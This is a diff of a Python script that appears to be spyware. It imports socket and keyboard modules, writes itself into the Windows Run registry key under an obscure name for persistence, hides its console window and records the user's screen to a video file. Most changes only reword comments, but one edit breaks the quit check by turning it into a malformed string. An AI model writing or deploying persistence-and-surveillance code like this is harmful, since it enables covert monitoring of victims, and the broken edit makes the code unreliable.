@@ -1,6 +1,5 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-
 import socket 
 import sys
 import keyboard
@@ -52,7 +51,7 @@ def addStartup(): # this will add the file to the startup registry key
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
     SetValueEx (key2change, 'Howcelmzexpla27831910', 0, REG_SZ, new_file_path)
-                            #gDHwodhqoueSsfa42393t
+                            #gDHwodhqoueSs07423933
 def Hide():
     import win32console
     import win32gui
@@ -125,13 +124,13 @@ resolution = (1920, 1080)
 #the video codec type
 codec = cv2.VideoWriter_fourcc(*"XVID")
 
-#file for offloading video
+#dump file for video recording that has been capped
 filename = "Recording.avi"
 
-#frame rate of the recording
+#the frame rate of the recording
 fps = 30
 
-#synthesis of VideoWriter 
+#VideoWriter creation 
 out = cv2.VideoWriter(filename, codec, fps, resolution)
 
 #Empty window
@@ -147,8 +146,8 @@ while True:
 
     #Convert screenshot into an array with numpy
     frame = np.array(img)
-    
-    #Convert from BGR coloring to RGB
+
+    #Conversion from BGR coloring to RGB
     frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
 
     #writes to the output files
@@ -158,7 +157,7 @@ while True:
     cv2.imshow('Live', frame)
 
     #Order to stop REC when q is pressed
-    cv2.waitKey(1) == ord('q')
+    cv2.waitKey(1) == 'ord ('f')'
     break
 
 # releases vid writer
